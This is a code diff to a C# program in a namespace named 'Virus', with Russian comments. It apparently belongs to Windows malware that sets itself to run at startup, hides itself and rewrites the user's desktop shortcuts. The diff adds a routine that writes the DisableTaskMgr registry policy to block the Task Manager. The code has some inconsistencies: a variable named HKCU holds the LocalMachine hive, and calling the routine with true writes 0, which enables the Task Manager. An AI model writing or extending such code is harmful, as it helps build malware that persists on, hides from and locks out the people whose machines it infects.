@@ -13,11 +13,10 @@ namespace Virus
         {
             SetStartup();
             HideAll();
+            ToggleTaskManager(true);
 
             // Получение пути к рабочему столу
             var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-
-            var testFolder = @"C:\Users\New\Desktop\Test";
 
             // Получение файлов ярлыков
             var files = ShellLinkHelper.GetAllShellLinkFiles(desktopFolder);
@@ -34,6 +33,17 @@ namespace Virus
                         QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                 }
             }
+        }
+
+        /// <summary>
+        /// Включает или выключает диспетчер задач
+        /// </summary>
+        /// <param name="toggle"></param>
+        private static void ToggleTaskManager(bool toggle)
+        {
+            Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.LocalMachine;
+            Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            key.SetValue("DisableTaskMgr", toggle ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);
         }
 
         /// <summary>
